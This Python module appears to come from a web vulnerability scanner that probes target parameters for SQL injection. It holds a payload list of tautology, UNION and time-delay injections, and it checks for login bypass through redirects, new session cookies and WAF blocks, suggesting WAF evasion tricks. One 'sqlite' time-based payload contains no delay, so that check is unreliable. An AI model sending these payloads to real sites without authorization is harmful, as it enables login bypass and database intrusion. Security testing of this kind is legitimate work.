import time

SQLI_PAYLOADS = [
    {"name": "single_quote", "payload": "'"},
    {"name": "double_quote", "payload": "\""},
    {"name": "or_true_dash", "payload": "' OR '1'='1' --"},
    {"name": "or_true_hash", "payload": "' OR 1=1#"},
    {"name": "or_false", "payload": "' AND 1=2 --"},
    {"name": "union_select", "payload": "' UNION SELECT NULL--"},
    {"name": "order_by", "payload": "' ORDER BY 1--"},
    {"name": "boolean_true", "payload": "' AND '1'='1"},
    {"name": "boolean_false", "payload": "' AND '1'='2"},
    {"name": "time_sleep_5", "payload": "'; SELECT SLEEP(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mysql", "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_pg", "payload": "'; SELECT pg_sleep(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mssql", "payload": "'; WAITFOR DELAY '00:00:05' --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_sqlite", "payload": "' AND (SELECT 1 FROM (SELECT 1) WHERE 1=1) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_benchmark", "payload": "'; SELECT BENCHMARK(50000000,MD5(1)) --", "time_based": True, "sleep_sec": 3},
]

ERROR_PATTERNS = [
    "sql", "mysql", "syntax error", "unclosed quotation",
    "odbc", "driver", "warning: mysql", "you have an error",
    "ora-", "oracle", "postgresql", "sqlite", "sql server",
    "division by zero", "unexpected", "mysql_fetch",
    "supplied argument is not a valid mysql",
    "pg_", "psql", "SQLSTATE",
]

AUTH_REDIRECT_PATHS = ["/dashboard", "/admin", "/home", "/panel", "/account", "/profile", "/user", "/backend"]


def _check_redirect_auth_bypass(baseline_resp, injection_resp, param_name, entry, engine):
    if injection_resp is None:
        return None
    baseline_redirect = baseline_resp is not None and baseline_resp.status_code in (301, 302, 307, 308)
    injection_redirect = injection_resp.status_code in (301, 302, 307, 308)
    if not injection_redirect:
        return None
    if baseline_redirect:
        return None

    location = injection_resp.headers.get("Location", "")
    for path in AUTH_REDIRECT_PATHS:
        if path in location:
            engine._log("VULN", f"CRITICAL: SQLi Auth Bypass on '{param_name}' via {entry['name']}")
            engine._log("VULN", f"  Injection caused redirect to {location} (baseline was not a redirect)")
            return {
                "type": "auth_bypass_redirect",
                "location": location,
                "detail": f"Injection ({entry['name']}) caused redirect to {location} — baseline did not redirect",
            }
    return None


def _check_status_code_change(baseline_resp, injection_resp, param_name, entry, engine):
    if injection_resp is None or baseline_resp is None:
        return None
    
    baseline_status = baseline_resp.status_code
    injection_status = injection_resp.status_code
    
    if baseline_status == injection_status:
        return None
    
    # Skip if it's just a redirect we already handle
    if injection_status in (301, 302, 307, 308):
        return None
    
    engine._log("INFO", f"Status code change on '{param_name}' via {entry['name']}: {baseline_status} → {injection_status}")
    
    # Check for specific interesting patterns
    if baseline_status == 200 and injection_status == 500:
        engine._log("VULN", f"Potential error-based SQLi on '{param_name}' via {entry['name']}")
        engine._log("VULN", f"  Status changed from 200 (OK) to 500 (Internal Server Error)")
        return {
            "type": "status_code_error",
            "baseline": baseline_status,
            "injection": injection_status,
            "detail": f"Injection ({entry['name']}) caused status change {baseline_status} → {injection_status} (potential error-based SQLi)",
        }
    
    if baseline_status == 200 and injection_status == 404:
        engine._log("INFO", f"Boolean-based SQLi indicator on '{param_name}' via {entry['name']}")
        engine._log("INFO", f"  Status changed from 200 (OK) to 404 (Not Found)")
        return {
            "type": "status_code_boolean",
            "baseline": baseline_status,
            "injection": injection_status,
            "detail": f"Injection ({entry['name']}) caused status change {baseline_status} → {injection_status} (boolean-based indicator)",
        }
    
    # Generic status code change (less severe but still interesting)
    return {
        "type": "status_code_change",
        "baseline": baseline_status,
        "injection": injection_status,
        "detail": f"Injection ({entry['name']}) caused status change {baseline_status} → {injection_status}",
    }


def _check_session_cookie_gain(baseline_resp, injection_resp, param_name, entry, engine):
    if injection_resp is None:
        return None
    baseline_cookie = baseline_resp.headers.get("Set-Cookie", "") if baseline_resp else ""
    injection_cookie = injection_resp.headers.get("Set-Cookie", "")
    if not injection_cookie:
        return None
    if baseline_cookie == injection_cookie:
        return None

    injection_name = injection_cookie.split("=")[0] if "=" in injection_cookie else ""
    baseline_name = baseline_cookie.split("=")[0] if "=" in baseline_cookie else ""
    if injection_name and injection_name != baseline_name:
        engine._log("VULN", f"Session cookie issued after injection on '{param_name}' via {entry['name']}")
        engine._log("VULN", f"  New cookie: {injection_cookie[:80]}")
        return {
            "type": "session_cookie_gain",
            "cookie": injection_cookie[:120],
            "detail": f"Injection ({entry['name']}) caused new session cookie: {injection_cookie[:80]}",
        }
    return None


def _check_waf_detection(baseline_resp, injection_resp, param_name, entry, engine):
    if injection_resp is None or baseline_resp is None:
        return None
    if baseline_resp.status_code == 200 and injection_resp.status_code in (403, 406):
        engine._log("WARN", f"WAF detected on '{param_name}' via {entry['name']} — baseline 200, injection {injection_resp.status_code}")
        return {
            "type": "waf_detected",
            "status": injection_resp.status_code,
            "detail": f"WAF blocked payload {entry['name']} with status {injection_resp.status_code} (baseline was 200)",
            "suggestions": ["Case variation", "URL encoding", "Null bytes", "Comments /**/", "Alternative operators"],
        }
    return None


def sqli_check(engine):
    engine._log("INFO", f"Starting SQLi detection on {engine.target_url}")
    results = []

    params = engine.extract_params()
    if not params:
        engine._log("WARN", "No parameters found for SQLi testing")
        return results

    for param in params:
        baseline_start = time.time()
        baseline_resp = engine.baseline(param)
        baseline_time = time.time() - baseline_start
        if baseline_resp is None:
            engine._log("WARN", f"Skipping '{param}' — baseline request failed")
            continue
        baseline_text = baseline_resp.text.lower()

        engine._log("INFO", f"Baseline for '{param}': {baseline_time:.2f}s, status={baseline_resp.status_code}")

        waf_detected = False

        for entry in SQLI_PAYLOADS:
            args = engine.build_request_args(param, entry["payload"])
            start = time.time()
            resp = engine.request(**args)
            elapsed = time.time() - start
            if resp is None:
                continue

            resp_text = resp.text.lower()
            confirmed = False
            evidence = []
            extra = {}

            waf = _check_waf_detection(baseline_resp, resp, param, entry, engine)
            if waf:
                extra["waf"] = waf
                waf_detected = True

            redirect_bypass = _check_redirect_auth_bypass(baseline_resp, resp, param, entry, engine)
            if redirect_bypass:
                confirmed = True
                extra["auth_bypass"] = redirect_bypass
                evidence.append(f"redirect auth bypass: {redirect_bypass['location']}")

            session_gain = _check_session_cookie_gain(baseline_resp, resp, param, entry, engine)
            if session_gain:
                confirmed = True
                extra["session_cookie"] = session_gain
                evidence.append(f"new session cookie issued")

            status_change = _check_status_code_change(baseline_resp, resp, param, entry, engine)
            if status_change:
                if status_change["type"] in ["status_code_error", "status_code_boolean"]:
                    confirmed = True
                extra["status_change"] = status_change
                evidence.append(f"status change: {status_change['baseline']} → {status_change['injection']}")

            if entry.get("time_based"):
                threshold = baseline_time + 4.0
                if elapsed > threshold:
                    engine._log("INFO", f"  Time anomaly on '{param}' with {entry['name']}: {elapsed:.2f}s (baseline {baseline_time:.2f}s)")
                    confirm_payload = entry["payload"].replace(str(entry["sleep_sec"]), "2")
                    confirm_args = engine.build_request_args(param, confirm_payload)
                    start2 = time.time()
                    confirm_resp = engine.request(**confirm_args)
                    elapsed2 = time.time() - start2
                    expected_ratio = 2.0 / entry["sleep_sec"]
                    expected_confirm = baseline_time + (elapsed - baseline_time) * expected_ratio
                    if confirm_resp and elapsed2 > baseline_time + 1.5 and elapsed2 >= expected_confirm * 0.5:
                        confirmed = True
                        evidence.append(f"primary: {elapsed:.2f}s (baseline {baseline_time:.2f}s)")
                        evidence.append(f"confirmed: {elapsed2:.2f}s with SLEEP(2)")
                        extra["time_evidence"] = {"primary": round(elapsed, 2), "confirm": round(elapsed2, 2)}
                        engine._log("VULN", f"Time-based SQLi CONFIRMED in '{param}' via {entry['name']}")
                        for e in evidence:
                            engine._log("VULN", f"  {e}")
                else:
                    continue

            found_errors = [p for p in ERROR_PATTERNS if p in resp_text]
            if found_errors:
                baseline_errors = [p for p in ERROR_PATTERNS if baseline_text and p in baseline_text]
                new_errors = [e for e in found_errors if e not in baseline_errors]
                if new_errors:
                    confirmed = True
                    evidence.append(f"new error indicators: {new_errors}")

            if entry["name"] == "boolean_false":
                true_args = engine.build_request_args(param, "' AND '1'='1")
                true_resp = engine.request(**true_args)
                if true_resp and resp and true_resp.status_code != resp.status_code:
                    confirmed = True
                    evidence.append(f"boolean: 1=1->{true_resp.status_code}, 1=2->{resp.status_code}")

            if confirmed:
                result_entry = {
                    "parameter": param,
                    "payload_type": entry["name"],
                    "payload": entry["payload"],
                    "evidence": evidence,
                    "status": resp.status_code,
                }
                if extra.get("waf"):
                    result_entry["waf"] = extra["waf"]
                if extra.get("auth_bypass"):
                    result_entry["auth_bypass"] = extra["auth_bypass"]
                    result_entry["severity"] = "critical"
                if extra.get("session_cookie"):
                    result_entry["session_cookie"] = extra["session_cookie"]
                    result_entry["severity"] = "critical"
                if extra.get("time_evidence"):
                    result_entry["time_evidence"] = extra["time_evidence"]
                if extra.get("status_change"):
                    result_entry["status_change"] = extra["status_change"]
                results.append(result_entry)
                break

        if waf_detected:
            engine._log("WARN", f"WAF detected on parameter '{param}' — consider bypass techniques")

    engine.results["sqli"] = results
    engine._log("INFO", f"SQLi detection complete. Confirmed: {len(results)}.")
    return results
